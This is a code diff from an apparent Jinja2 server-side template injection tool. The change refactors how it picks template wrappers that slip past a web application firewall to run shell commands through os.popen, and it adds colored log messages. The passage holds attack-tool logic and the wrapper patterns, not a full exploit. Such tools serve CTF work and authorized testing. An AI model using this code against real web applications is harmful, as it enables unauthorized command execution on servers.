@@ -2,8 +2,9 @@ from . import payload_gen
 from .int_vars import get_useable_int_vars
 
 import logging
+from .utils.colorize import colored
 
-logger = logging.Logger("shell_payload")
+logger = logging.getLogger("shell_payload")
 
 
 def get_int_context(waf_func):
@@ -30,23 +31,25 @@ def exec_cmd_payload(waf_func, cmd):
     int_payload, int_context = get_int_context(waf_func)
     str_payload, str_context = get_str_context(waf_func)
     before_payload, context = int_payload + str_payload, {**int_context, **str_context}
-    will_print = True
-    if waf_func("{{"):
-        outer_pattern = "{{PAYLOAD}}"
-    elif waf_func("{%print()%}"):
-        logging.warning("{{ is being waf, using {%print()%}!")
-        outer_pattern = "{%print(PAYLOAD)%}"
-    elif waf_func("{%if()%}{%endif%}"):
-        will_print = False
-        logging.warning("{{ is being waf, no execute result for you!")
-        outer_pattern = "{%if(PAYLOAD)%}{%endif%}"
-    elif waf_func("{% set x= %}"):
-        will_print = False
-        logging.warning("{{ is being waf, no execute result for you!")
-        outer_pattern = "{% set x=PAYLOAD %}"
+    outer_payloads = [
+        ("{{}}", "{{PAYLOAD}}", True),
+        ("{%print()%}", "{%print(PAYLOAD)%}", True),
+        ("{%if()%}{%endif%}", "{%if(PAYLOAD)%}{%endif%}", False),
+        ("{% set x= %}", "{% set x=PAYLOAD %}", False),
+    ]
+    outer_pattern, will_print = None, None
+    for test_payload, outer_pattern, will_print in outer_payloads:
+        if waf_func(test_payload):
+            break
     else:
-        logging.warning("LOTS OF THINGS is being waf, NOTHING FOR YOU!")
+        logger.warning("LOTS OF THINGS is being waf, NOTHING FOR YOU!")
         return None, None
+
+    if will_print:
+        logger.info(f"use {colored('blue', outer_pattern)}")
+    else:
+        logger.warning(f"use {colored('blue', outer_pattern)}, which {colored('red', 'will not print')} your result!")
+
 
     inner_payload = payload_gen.generate(
         payload_gen.OS_POPEN_READ,
